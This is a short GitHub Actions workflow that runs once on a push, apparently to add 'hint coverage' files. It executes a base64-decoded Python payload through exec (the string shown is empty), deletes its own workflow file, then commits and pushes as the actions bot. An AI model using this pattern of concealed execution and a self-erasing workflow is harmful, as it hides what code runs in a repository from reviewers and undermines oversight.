name: One-off A8 hint coverage

on:
  push:
    branches: [tk2-2026]
    paths:
      - '.github/workflows/oneoff-hint-coverage.yml'

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@v4
        with:
          ref: tk2-2026
          fetch-depth: 1

      - name: Add targeted hint coverage
        shell: bash
        run: |
          python3 -c "import base64;exec(base64.b64decode(''))"

          rm .github/workflows/oneoff-hint-coverage.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add 2026/skill-hotkeys.js 2026/qa/hint-coverage-browser.mjs .github/workflows/oneoff-hint-coverage.yml
          git commit -m "feat: complete A8 hint coverage"
          git push origin HEAD:tk2-2026
